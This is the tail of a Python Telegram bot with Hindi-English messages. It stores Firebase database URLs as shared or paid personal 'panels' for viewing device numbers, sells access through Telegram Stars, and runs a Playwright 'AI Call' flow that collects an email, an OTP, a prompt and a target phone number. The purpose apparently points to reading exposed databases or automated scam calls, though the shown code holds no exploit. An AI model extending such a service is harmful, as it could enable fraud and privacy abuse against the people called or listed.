        firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
        if not firebase_urls: return await update.message.reply_text("Koi valid Firebase URL nahi mili.")
        SETTINGS.setdefault("global_panels", []).extend(firebase_urls)
        save_settings()
        return await update.message.reply_text(f"✅ SUCCESS! {len(firebase_urls)} panels Global Default list me add ho gaye hain.")

    if action == "set_personal_db":
        urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
        firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
        if not firebase_urls: return await update.message.reply_text("❌ Invalid Input! Kripya sirf Firebase URLs bhejein.")
        pending_action.pop(chat_id)
        expiry_time = time.time() + (86400 * 365) 
        for custom_url in firebase_urls:
            users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": custom_url, "expiry": expiry_time})
        save_user(chat_id)
        return await update.message.reply_text(f"✅ {len(firebase_urls)} Personal Firebase URLs successfully add ho gaye!\n\nAb aap 'Devices List' me jakar sirf apne numbers dekh sakte hain.", reply_markup=get_reply_menu(chat_id))

# ═══════════════════════════════════════════════════════
#  MAIN RUNNER
# ═══════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN or TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE": raise SystemExit("TOKEN is missing!")
    if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

    threading.Thread(target=run_health_server, daemon=True).start()

    app = Application.builder().token(TOKEN).build()
    
    # 🤖 AI Call Command (Playwright)
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('call', initiate_call)],
        states={
            WAIT_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_email)],
            WAIT_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_otp)],
            WAIT_PROMPT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_prompt)],
            WAIT_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_number)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    app.add_handler(conv_handler)
    
    app.add_handler(CommandHandler("start",   cmd_start, block=False))
    app.add_handler(CommandHandler("admin",   cmd_admin, block=False))
    app.add_handler(CallbackQueryHandler(on_callback, block=False))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text, block=False))
    
    # 🔥 TELEGRAM STARS PAYMENT HANDLERS
    app.add_handler(PreCheckoutQueryHandler(precheckout_callback, block=False))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment_callback, block=False))

    async def post_init(application: Application) -> None:
        load_data()
        asyncio.create_task(global_cache_loop())  
        asyncio.create_task(auto_save_loop())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
